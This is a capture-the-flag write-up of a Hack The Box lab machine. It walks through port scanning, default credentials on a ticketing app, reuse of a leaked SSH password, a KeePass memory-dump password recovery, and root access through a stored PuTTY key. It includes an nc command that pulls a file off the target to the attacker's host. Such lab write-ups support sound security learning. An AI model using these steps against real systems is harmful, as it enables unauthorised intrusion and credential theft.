Keeper

Target IP: 10.129.50.41
Challenge Description: N/A

Reconnaissance


Performing a port scan using the command sudo nmap -sS 10.129.50.41 -p- returns the result above. According to the scan above, there are two TCP ports open on the target machine.


Performing an aggressive port scan using the command sudo nmap -sV -A 10.129.50.41 -p 22,80 returns the result above. There is an interesting HTTP application on port 80. There is also an SSH application but I have not found any credentials. I will start my enumeration with the HTTP application on port 80 first.

Enumeration

Port 80: HTTP

Browsing to http://10.129.50.41 displays the webpage above. The message shown above is returned. It informs me to add tickets.keeper.htb to visit the IT support ticket web application. Time to add this hostname inside my /etc/hosts file.


After modifying my /etc/hosts file by adding the entry 10.129.50.41 tickets.keeper.htb, it is time to enumerate.


Browsing to http://tickets.keeper.htb/rt/ displays the login webpage above. This login page contains the application name Request Tracker with the application version string 4.4.4+dfsg-2ubuntu1, as shown above. I will start off first with the basic attack vector first: trying default credentials.


Searching for the default credentials of this application shows it is root:password. And firing the default credentials worked. Now I have access to the web application as the user root. It seems like the default credentials of the web application was not changed and we found an entry point!


Before performing any attacks, I decided to enumerate the web application to identify any crucial information and found the open ticket shown above. I have highlighted the crucial information in yellow as it contains crash dump about the Keepass program. Can I obtain the crash dump if I gain access to this user called lnorgaard?


Now I have the credentials lnorgaard:Welcome2023!, as shown above. Although it is the initial password, what if this user has not changed this password? Can I test this credentials against the SSH and the web application? Time to find out.

Exploitation


Bingo! It seems like the user lnorgaard has not changed their password Welcome2023! for SSH. Now I have a foothold on the target machine as the user lnorgaard via SSH, as shown above. Time to perform privilege escalation now!

Privilege Escalation


The user lnorgaard has an interesting file called RT3000.zip in their home directory, as shown above. Time to transfer this to my machine and identify what it is.


Since netcat is already installed on the target machine, I used the command nc -w 3 10.10.14.170 1234 < RT30000.zip to transfer the zip file to my machine. On my machine, I used the command nc -l -p 1234 > RT30000.zip to receive the zip file as shown above.


After unzipping the file, I obtained the two files shown above. I will need to analyse the memory dump file first.


Searching for Keepass dump vulnerabilities, I came across the Python code shown above. Then I downloaded this on my machine with the name as poc.py. According to the exploit, it is responsible for obtaining the master password from KeePass's dump memory.


I ran the exploit against the dump file using the command python3 poc.py -d KeePassDumpFull.dmp and got the result above. It seems like the password dgrød med fløde is possible. However, it did not work. Doing some research for dgrød med fløde seems to bring up rødgrød med fløde the most -- is this the password?



And bingo! Entering the password rødgrød med fløde worked. Now I have access to the passcodes.kdbx file, as shown above. Since I already have the password belonging to the user lnorgaard, the entry for keeper.htb seems the most interesting to me.


The password belonging to the user root for keeper.htb is shown above. I find the notes section the most interesting as it contains the PuTTy user key file. I copied the entire content to a file called id_rsa. Time to use PuTTy and the user key file to gain access to the target machine.


I added the id_rsa as shown above for the authentication.


Then I changed the hostname to the target IP address of 10.129.50.41.


A new shell opened and then I entered the username root. And bingo! Now I have a root shell using PuTTy, as shown above.
